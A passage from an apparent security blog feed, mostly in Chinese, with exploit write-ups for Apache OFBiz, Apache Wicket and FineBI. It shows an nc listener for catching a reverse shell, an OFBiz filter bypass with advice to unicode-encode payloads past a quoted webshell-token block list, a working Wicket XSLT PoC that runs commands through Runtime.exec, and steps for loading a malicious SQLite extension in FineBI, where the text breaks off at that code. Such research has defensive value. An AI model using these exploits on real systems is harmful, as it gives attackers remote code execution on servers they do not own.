class="hljs-symbol">\u0029</span></span><br></code></pre></td></tr></table></figure><p>Using nc snooping on Linux 8888</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>Shell is successfully obtained after the corresponding packet is sent.</p><h3 id="0x03-Code-analysis"><a href="#0x03-Code-analysis" class="headerlink" title="0x03  Code analysis"></a>0x03  Code analysis</h3><p>If the url I submitted is <strong>control&#x2F;main&#x2F;ProgramExport</strong>, filter will do the following</p><p>org.apache.ofbiz.webapp.control.ControlFilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(((HttpServletRequest) request).getRequestURL().toString())<br>            .normalize().toString()<br>            .replaceAll(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>            .replaceAll(<span class="hljs-string">&quot;(?i)%2e&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!((HttpServletRequest) request).getRequestURL().toString().equals(url)) &#123;<br>        Debug.logError(<span class="hljs-string">&quot;For security reason this URL is not accepted&quot;</span>, <span class="hljs-keyword">module</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;For security reason this URL is not accepted&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (URISyntaxException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br></code></pre></td></tr></table></figure><p>You can see in lines 137-148 that this is a fix for (CVE-2024-32113) Path traversal leading to RCE.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (!allowedPaths.contains(requestUri.substring(<span class="hljs-number">0</span>, offset))) &#123;<span class="hljs-comment">//  allowedPaths  “/control/main”</span><br>    offset = requestUri.indexOf(<span class="hljs-string">&quot;/&quot;</span>, offset + <span class="hljs-number">1</span>);  <br>    <span class="hljs-keyword">if</span> (offset == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (allowedPaths.contains(requestUri)) &#123; <br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// path not allowed</span><br>        <span class="hljs-keyword">if</span> (redirectPath == <span class="hljs-literal">null</span>) &#123;<br>            httpResponse.sendError(errorCode, httpRequest.getRequestURI());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirectPathIsUrl) &#123;<br></code></pre></td></tr></table></figure><p>Then look down, line 174 redirectPath and go to the position of <strong>“&#x2F;“</strong> for splicing, and finally get <strong>&#x2F; control&#x2F;main</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">                <span class="hljs-keyword">if</span> (Debug.infoOn()) &#123;<br>                    Debug.logInfo(<span class="hljs-string">&quot;[Filtered request]: &quot;</span> + httpRequest.getRequestURI() + <span class="hljs-string">&quot; --&gt; &quot;</span> + (redirectPath == <span class="hljs-literal">null</span>? errorCode: redirectPath), <span class="hljs-keyword">module</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, httpResponse);  <span class="hljs-comment">//Finally, filter intercepts control/main, and finally passes filter detection.</span><br>    &#125;/control/main <br>&#125;<br></code></pre></td></tr></table></figure><p>Finally, filter is called to check <strong>“&#x2F; control&#x2F;main”</strong>, but <strong>“&#x2F; control&#x2F;main”</strong> does not require authentication, so bypass the filter check.。</p><p>After a series of processing, come to</p><p><strong>org.apache.ofbiz.webapp.control.RequestHandler#doRequest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// workaround if we are in the root webapp</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cname</span> <span class="hljs-operator">=</span> UtilHttp.getApplicationName(request);<br><br><span class="hljs-comment">// Grab data from request object to process</span><br><span class="hljs-type">String</span> <span class="hljs-variable">defaultRequestUri</span> <span class="hljs-operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());<br><br><span class="hljs-type">String</span> <span class="hljs-variable">requestMissingErrorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unknown request [&quot;</span><br>        + defaultRequestUri<br>        + <span class="hljs-string">&quot;]; this request does not exist or cannot be called directly.&quot;</span>;<br><span class="hljs-comment">//... 273</span><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getPathInfo();<br><span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> getRequestUri(path);<br><span class="hljs-type">String</span> <span class="hljs-variable">overrideViewUri</span> <span class="hljs-operator">=</span> getOverrideViewUri(path); <span class="hljs-comment">// Control/main/ProgramExport gets ProgramExport.</span><br>Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);<br><span class="hljs-keyword">if</span> (rmaps.isEmpty()) &#123;<br>    <span class="hljs-keyword">if</span> (throwRequestHandlerExceptionOnMissingLocalRequest) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(requestMissingErrorMessage)<br></code></pre></td></tr></table></figure><p>Get the path at line 275 to get the final url, get the <strong>ProgramExport</strong>, and assign the value to <strong>overrideViewUri</strong>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//... 742 </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value; <span class="hljs-comment">// get viewName (ProgramExport) </span><br>    renderView(viewName, requestMap.securityExternalView, request, response, saveName);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;view-last&quot;</span>.equals(nextRequestResponse.type)) &#123;<br></code></pre></td></tr></table></figure><p>From lines 741 to 743, get the name <strong>“view”</strong> from <strong>overrideViewUri</strong>, and then call renderView to render.</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...56 </span><br>parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br><br><span class="hljs-keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span><br>        <span class="hljs-keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="hljs-string">&quot;import&quot;</span>])) &#123;<br>            logError(<span class="hljs-string">&quot;================== Not executed for security reason ==================&quot;</span>)<br>            request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="hljs-string">&quot;Not executed for security reason&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        shell.parse(groovyProgram)<br>        shell.evaluate(groovyProgram)<br>        recordValues = shell.getVariable(<span class="hljs-string">&quot;recordValues&quot;</span>)<br>        xmlDoc = GenericValue.makeXmlDocument(recordValues)<br></code></pre></td></tr></table></figure><p>Between lines 55 and 80, we can see that the <strong>ProgramExport</strong> receives the parameter <strong>groovyProgram</strong> to pass the value. Then call the <strong>SecuredUpload.isValidText</strong> function to check the blacklist.</p><p>org.apache.ofbiz.security.SecuredUpload#isValidText</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MODULE</span> <span class="hljs-operator">=</span> SecuredUpload.class.getName();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; DENIEDFILEEXTENSIONS = getDeniedFileExtensions();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">MAXLINELENGTH</span> <span class="hljs-operator">=</span> UtilProperties.getPropertyAsInteger(<span class="hljs-string">&quot;security&quot;</span>, <span class="hljs-string">&quot;maxLineLength&quot;</span>, <span class="hljs-number">10000</span>);<br><br>.....<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidText</span><span class="hljs-params">(String content, List&lt;String&gt; allowed)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> content != <span class="hljs-literal">null</span> ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -&gt; isValid(content, token.toLowerCase(), allowed)) : <span class="hljs-literal">false</span>;<br>    &#125;<br>...<br><span class="hljs-number">770</span>  <br>      <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getDeniedWebShellTokens</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">deniedTokens</span> <span class="hljs-operator">=</span> UtilProperties.getPropertyValue(<span class="hljs-string">&quot;security&quot;</span>, <span class="hljs-string">&quot;deniedWebShellTokens&quot;</span>);<br>        <span class="hljs-keyword">return</span> UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, <span class="hljs-string">&quot;,&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>Blacklist in <strong>DENIEDWEBSHELLTOKENS</strong></p><p>framework&#x2F;security&#x2F;config&#x2F;security.properties </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">... <span class="hljs-number">238</span><br>deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,&lt;?php,exec(,alert(,\<br>                     %eval,<span class="hljs-meta">@eval</span>,eval(,runtime,<span class="hljs-keyword">import</span>,passthru,shell_exec,<span class="hljs-keyword">assert</span>,str_rot13,system,decode,include,page ,\<br>                     chmod,mkdir,fopen,fclose,<span class="hljs-keyword">new</span> <span class="hljs-title class_">file</span>,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\<br>                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,<span class="hljs-keyword">static</span>,assign,webappPath,\<br>                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,<span class="hljs-string">&quot;cmd&quot;</span>,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\<br>                     execute,println,calc,touch,calculate<br><br></code></pre></td></tr></table></figure><p>As you can see, it is based on character matching, and we only need to <strong>unicode the payload to bypass it</strong>.</p><p>At this point, the entire exploit is completed.</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Wicket代码执行(官方认为是正常功能)</title>
    <link href="/2024/08/04/Apache-Wicket%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%AE%98%E6%96%B9%E8%AE%A4%E4%B8%BA%E6%98%AF%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD/"/>
    <url>/2024/08/04/Apache-Wicket%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%AE%98%E6%96%B9%E8%AE%A4%E4%B8%BA%E6%98%AF%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p>​Apache Wicket是一个Java 语言的Web开发框架。2024年6月，官方发布 9.18.0 与 10.1.0 版本 修复CVE-2024-36522 Apache Wicket XSLT 代码执行漏洞。攻击者可构造恶意请求执行任意代码，控制服务器。但是在 9.18.0 与 10.1.0 版本仍可以进行XSLT 代码执行。</p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02  漏洞分析"></a>0x02  漏洞分析</h3><p>org.apache.wicket.util.resource.XSLTResourceStream#XSLTResourceStream(org.apache.wicket.util.resource.IResourceStream, org.apache.wicket.util.resource.IResourceStream)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">XSLTResourceStream</span><span class="hljs-params">(IResourceStream xsltResource, IResourceStream xmlResource)</span> &#123;<br>    <span class="hljs-built_in">this</span>(xsltResource, xmlResource, defaultTransformerFactory());<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">defaultTransformerFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">TransformerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> TransformerFactory.newInstance();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        factory.setFeature(<span class="hljs-string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125; <span class="hljs-keyword">catch</span> (TransformerConfigurationException var2) &#123;<br>        <span class="hljs-type">TransformerConfigurationException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var2;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个可以看见9.18.0 与 10.1.0 版本修复方案是写了一个defaultTransformerFactory，启用安全处理特性，防止解析不安全的扩展函数。</p><p>这里可以看见调用 this(xsltResource, xmlResource, defaultTransformerFactory()), 里面继续调用TransformerFactory factory &#x3D; TransformerFactory.newInstance();但是他是一个public方法，我们可以控制transformerFactory，导致9.18.0 与 10.1.0 版本中的defaultTransformerFactory失效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformerFactory</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformerFactory</span><span class="hljs-params">()</span> &#123; &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">newDefaultInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TransformerFactory <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerFactoryConfigurationError &#123;<br><br>        <span class="hljs-keyword">return</span> FactoryFinder.find(<br>            <span class="hljs-comment">/* The default property name according to the JAXP spec */</span><br>            TransformerFactory.class,<br>            <span class="hljs-comment">/* The fallback implementation class name, XSLTC */</span><br>            <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>建议修改为private方法。</p><h3 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h3><p>使用 Apache Maven 将您的依赖项更新为修复<strong>CVE-2024-36522</strong>的版本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.wicket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wicket-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.wicket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wicket-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.18.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新建一个恶意的test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="hljs-attr">xmlns:java</span>=<span class="hljs-string">&quot;http://saxon.sf.net/java-type&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;Runtime:exec(Runtime:getRuntime(),&#x27;open -a calculator&#x27;)&quot;</span> <span class="hljs-attr">xmlns:Runtime</span>=<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写一个poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.unam4;<br><br><span class="hljs-keyword">import</span> org.apache.wicket.util.file.File;<br><span class="hljs-keyword">import</span> org.apache.wicket.util.resource.FileResourceStream;<br><span class="hljs-keyword">import</span> org.apache.wicket.util.resource.XSLTResourceStream;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerFactory;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileResourceStream</span> <span class="hljs-variable">stream1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileResourceStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;test.xml&quot;</span>));<br>        <span class="hljs-type">FileResourceStream</span> <span class="hljs-variable">stream2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileResourceStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;test.xml&quot;</span>));<br>        <span class="hljs-type">TransformerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> TransformerFactory.newInstance();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">XSLTResourceStream</span>(stream1,stream2,factory);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后成功弹出计算器。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fine报表问题</title>
    <link href="/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-帆软finereBI-report后台本地命令执行"><a href="#0x01-帆软finereBI-report后台本地命令执行" class="headerlink" title="0x01 帆软finereBI&#x2F;report后台本地命令执行"></a>0x01 帆软finereBI&#x2F;report后台本地命令执行</h2><p><img src="image-20240614022512688.png" alt="image-20240614022512688"></p><p>JAR包版本号：</p><p>6.1.0（JAR：Build#persist-2024.05.30.11.06.10.457） </p><p><a href="https://www.finebi.com/product/download">https://www.finebi.com/product/download</a></p><p><img src="image-20240614022553224.png" alt="image-20240614022553224"></p><p>对应版本6月12日的版本</p><h3 id="0x02-poc-构造"><a href="#0x02-poc-构造" class="headerlink" title="0x02 poc 构造"></a>0x02 poc 构造</h3><p>下载发现官方软件代码,出厂lib中存在sqlite组件。</p><p><img src="image-20240614023128668.png" alt="image-20240614023128668"></p><p><a href="http://localhost:37799/webroot/decision#/management/connection">http://localhost:37799/webroot/decision#/management/connection</a></p><p>在url可以配置数据库连接</p><p><img src="image-20240614022840926.png" alt="image-20240614022840926"></p><p>jdbcurl可控这里可以是设置为 <strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong></p><p>开启**load_extension()**函数</p><p><a href="https://sqlite.readdevdocs.com/loadext.html">https://sqlite.readdevdocs.com/loadext.html</a> 这里有恶意dll 编写模版。</p><p>这里我是mac系统;</p><p>对应的恶意dll文件代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 